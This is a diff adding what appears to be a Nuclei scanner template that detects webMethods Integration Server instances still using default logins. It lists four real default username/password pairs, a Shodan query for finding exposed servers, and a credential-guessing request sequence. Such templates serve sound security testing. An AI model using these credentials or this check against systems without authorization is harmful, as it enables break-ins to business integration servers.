@@ -1,0 +1,70 @@
+id: webmethod-integration-default-login
+
+info:
+  name: WebMethod Integration Server Default Login
+  author: ChristianPoeschl,OleWagner,usdAG
+  severity: high
+  reference:
+    - https://documentation.softwareag.com/
+  classification:
+    cpe: cpe:2.3:a:softwareag:webmethods:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 5
+    shodan-query: "http.favicon.hash:-234335289"
+    product: webmethods
+    vendor: softwareag
+  tags: default-login,webmethod,vuln
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/invoke/pub.file/getFile"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 403 || status_code == 401
+          - contains(to_lower(header), 'integration server')
+        condition: and
+        internal: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/invoke/pub.file/getFile"
+    headers:
+      Authorization: "{{base64(username + ':' + password)}}"
+      Cookie: ssnid=
+
+    cookie-reuse: false
+    threads: 10
+    attack: pitchfork
+    payloads:
+      username:
+        - Administrator
+        - Developer
+        - Replicator
+        - SAPUser
+      password:
+        - manage
+        - isdev
+        - iscopy
+        - 22101999
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - com.wm.app.b2b.server
+          - No filename supplied
+        condition: and
+
+      - type: word
+        words:
+          - com.wm.app.b2b.server.AccessException
+          - Invalid credentials
+        negative: true
+        condition: and
+# digest: 4a0a0047304502203ab41bc9416a03fe26c84c2bb3cd38f42044bc7ee11b86d8d9001fd0cbef4b2b022100d02896dda64601687f8e802a2fda4f74ee4e8993103d7f47bd1c0034e81bf58b:922c64590222798bb761d5b6d8e72950
